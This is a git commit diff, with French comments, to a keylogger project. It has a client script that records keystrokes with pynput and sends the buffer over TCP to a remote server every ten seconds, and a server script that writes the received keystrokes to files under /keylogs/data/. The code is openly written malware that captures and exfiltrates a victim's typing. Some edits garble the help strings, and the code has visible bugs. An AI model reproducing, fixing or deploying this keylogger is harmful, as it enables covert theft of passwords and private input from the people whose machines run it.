4838e3710d548bc24fc27e9a8f9590b6351d2c6a
lululufr <lucas.lm.miller@gmail.com>
2023-10-30 13:41:38 +0100

    d

--- client/main-wk.py
+++ client/main-wk.py
@@ -8,15 +8,15 @@ from pynput.keyboard import Key, Listener
 
 def argument():
     p = argparse.ArgumentParser(description='Ajouter description')
-    p.add_argument('-p', '--ping', action='store_true', help='Fais un scan via Ping, pour voir les machines UP')
-    p.add_argument('-s', '--socket',type=all, help="Recherche si le port spécifié est UP, mettre autre chose qu'un INT pour faire sur les 100 premiers ports")
-    p.add_argument('-o', action='store_true', help='Enregistre les resultats dans un fichier')
+    p.add_argument('-p', '--ping', action='store_true', help='Faffs UP')
+    p.add_argument('-s', '--socket',type=all, help="ffffles 100 premiers ports")
+    p.add_argument('-o', action='store_true', help='Enregifer')
     args = p.parse_args()
     return args
 
 
 
-TXT_GLOB = "ho"
+TXT_GLOB = ""
 
 
 def kpr(key):
@@ -28,36 +28,32 @@ def kpr(key):
 
 
 def chrono():
+    global TXT_GLOB
     while True:
         seconds = 0
         while True:
             print(f"Secondes : {seconds}")
             seconds += 1
             time.sleep(1)
-            if seconds == 10 :
-                send_t = threading.Thread(target=send)
+            if seconds % 10 == 0 :
+                send_t = threading.Thread(target=send(TXT_GLOB))
                 send_t.start()
-                print(TXT_GLOB)
+                #print(TXT_GLOB)
+                TXT_GLOB = ""
 def keylogger():
     with Listener(on_press=kpr) as listener:
         listener.join()
 
 
-def send():
-
-    global TXT_GLOB
+def send(data):
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     client_socket.connect((SRV, PORT))
 
-    message = TXT_GLOB
-
-    client_socket.send(message.encode('utf-8')) ##envoi
-
-    client_socket.send(TXT_GLOB) # envoie fichier
+    client_socket.send(data.encode('utf-8')) ##envoi
 
     client_socket.close()
-
+    #print(data)
 
 
 
--- srv/main-srv.py
+++ srv/main-srv.py
@@ -1,15 +1,20 @@
 import argparse
 import socket
+import threading
+
 from env import *
+import datetime
 
 
 def argument():
     p = argparse.ArgumentParser(description='NMAP MAIS EN MIEUX en faite.')
     p.add_argument('-p', '--ping', action='store_true', help='Fais un scan via Ping, pour voir les machines UP')
-    p.add_argument('-s', '--socket',type=all, help="Recherche si le port spécifié est UP, mettre autre chose qu'un INT pour faire sur les 100 premiers ports")
+    p.add_argument('-s', '--socket', type=all,
+                   help="Recherche si le port spécifié est UP, mettre autre chose qu'un INT pour faire sur les 100 premiers ports")
     p.add_argument('-o', action='store_true', help='Enregistre les resultats dans un fichier')
     args = p.parse_args()
     return args
+
 
 
 
@@ -17,21 +22,30 @@ server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 server_socket.bind(("0.0.0.0", PORT))
 
-
-
 server_socket.listen(5)
 
-print(f"Le serveur écoute sur {SRV}:{PORT}")
 
-client_socket, client_address = server_socket.accept()
-print(f"Connexion acceptée de {client_address}")
+def receiver():
+    print(f"Ecoute sur {SRV}:{PORT}")
 
-    # Recevoir des données du client
-data = client_socket.recv(1024)
-print(f"Données reçues du client : {data.decode('utf-8')}")
+    client_socket, client_address = server_socket.accept()
+    print(f"connexion de {client_address}")
 
-# Fermer les connexions
-client_socket.close()
-server_socket.close()
+    ficname = str(client_address + datetime.date.today())
+    # recu data
+    with open("/keylogs/data/"+ficname, "a") as f:
+        data = client_socket.recv(1024)
+        f.write(data.decode('utf-8'))
+        print("Data update vers -> :" + ficname)
+
+    client_socket.close()
+    server_socket.close()
 
 
+receiver_t = threading.Thread(target=receiver)
+
+receiver_t.start()
+
+#commands_t = threading.Thread(target=commands)
+
+#commands_t.start()
